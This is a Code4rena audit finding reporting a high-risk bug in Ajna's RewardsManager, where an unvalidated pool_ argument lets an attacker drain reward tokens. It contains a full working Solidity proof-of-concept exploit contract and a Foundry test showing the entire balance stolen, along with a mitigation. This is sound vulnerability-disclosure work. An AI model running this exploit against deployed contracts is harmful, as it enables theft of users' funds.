## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- H-11

# [RewardsManager fails to validate `pool_` when updating exchange rates allowing rewards to be drained](https://github.com/code-423n4/2023-05-ajna-findings/issues/8) 

# Lines of code

https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L310-L318
https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L794-L794
https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L811-L821


# Vulnerability details

## Impact
The `updateBucketExchangeRatesAndClaim` method is designed to reward people for keeping the current exchange rate up to date (it has the following description: "Caller can claim `5%` of the rewards that have accumulated to each bucket since the last burn event, if it hasn't already been updated").

The issue is that there is no check on the `pool_` to ensure that is a valid ajna pool or that it is a pool from a currently staked token.

This means that an attacker can supply their own contract to control all of the values used to calculate the reward amount, allowing them to transfer an arbitrary amount of reward tokens (up to the balance of the rewards manager).

## Proof of Concept
The following test can be placed in https://github.com/code-423n4/2023-05-ajna/tree/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/tests/forge/unit/Rewards as `StealRewards.t.sol` and then run with `forge test  -m testStealRewards -vv`, showing that an attacker can steal all of the ajna tokens held by the rewards manager:

```bash
$ forge test  -m testStealRewards -vv

Running 1 test for tests/forge/unit/Rewards/StealRewards.t.sol:StealRewardsTest
[PASS] testStealRewards() (gas: 494833)
Logs:
  Rewards balance before: 100000000000000000000000000
  Hacker balance before : 0
  Rewards balance after : 0
  Hacker balance after  : 100000000000000000000000000

Test result: ok. 1 passed; 0 failed; finished in 6.57s
```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import 'src/RewardsManager.sol';
import 'src/PositionManager.sol';

import '@std/Test.sol';
import '@std/Vm.sol';

contract StealRewards {
    ERC20 ajnaToken;
    IRewardsManager rewardsManager;

    uint256 _currentBurnEpoch;
    uint256 toSteal;

    constructor(ERC20 _ajnaToken, IRewardsManager _rewardsManager) {
        ajnaToken = _ajnaToken;
        rewardsManager = _rewardsManager;
    }

    function currentBurnEpoch() external view returns (uint256) {
        return _currentBurnEpoch;
    }

    function bucketExchangeRate(uint) external view returns (uint256) {
        return 1 ether + _currentBurnEpoch;
    }

    function burnInfo(uint256 index) external view returns (uint256 burnBlock_, uint256 totalInterest_, uint256 totalBurned_) {
        if (index == 1) {
            return (block.timestamp + 2 weeks, 0, 0);
        } else {
            return (block.timestamp + 2 weeks, 1, toSteal * 20);
        }
    }

    function bucketInfo(uint256) external pure returns (
        uint256 lpAccumulator_,
        uint256 availableCollateral_,
        uint256 bankruptcyTime_,
        uint256 bucketDeposit_,
        uint256 bucketScale_
    ) {
        return (0, 0, 0, 1 ether, 0);
    }

    function steal() external {
        toSteal = ajnaToken.balanceOf(address(rewardsManager));

        uint256[] memory depositIndexes = new uint256[](1);
        depositIndexes[0] = 0;

        // setup the `prevBucketExchangeRate`
        _currentBurnEpoch = 1;
        rewardsManager.updateBucketExchangeRatesAndClaim(address(this), depositIndexes);

        _currentBurnEpoch = 2;
        rewardsManager.updateBucketExchangeRatesAndClaim(address(this), depositIndexes);
    }

}

contract StealRewardsTest is Test {
    address internal _ajna = 0x9a96ec9B57Fb64FbC60B423d1f4da7691Bd35079;
    ERC20 internal _ajnaToken;

    IRewardsManager  internal _rewardsManager;
    IPositionManager internal _positionManager;
    ERC20PoolFactory internal _poolFactory;

    function setUp() external {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        _ajnaToken       = ERC20(_ajna);
        _poolFactory = new ERC20PoolFactory(_ajna);
        _positionManager = new PositionManager(_poolFactory, new ERC721PoolFactory(_ajna));
        _rewardsManager  = new RewardsManager(_ajna, _positionManager);

        deal(_ajna, address(_rewardsManager), 100_000_000 * 1e18);
        assertEq(_ajnaToken.balanceOf(address(_rewardsManager)), 100_000_000 * 1e18);
    }

    function testStealRewards() external {
        StealRewards stealRewards = new StealRewards(_ajnaToken, _rewardsManager);
        uint rewardsManagerBalance = _ajnaToken.balanceOf(address(_rewardsManager));

        emit log_named_uint("Rewards balance before", rewardsManagerBalance);
        emit log_named_uint("Hacker balance before ", _ajnaToken.balanceOf(address(stealRewards)));

        stealRewards.steal();

        assertEq(_ajnaToken.balanceOf(address(stealRewards)), rewardsManagerBalance);
        assertEq(_ajnaToken.balanceOf(address(_rewardsManager)), 0);

        emit log_named_uint("Rewards balance after ", _ajnaToken.balanceOf(address(_rewardsManager)));
        emit log_named_uint("Hacker balance after  ", _ajnaToken.balanceOf(address(stealRewards)));
    }

}
```

## Tools Used
Foundry, IntelliJ

## Recommended Mitigation Steps
The `updateBucketExchangeRatesAndClaim` method should only be able to be called with a valid Ajna pool (see [PositionManager._isAjnaPool](https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/PositionManager.sol#L416-L416)) and potentially only allow pools from the currently staked tokens.


## Assessed type

Invalid Validation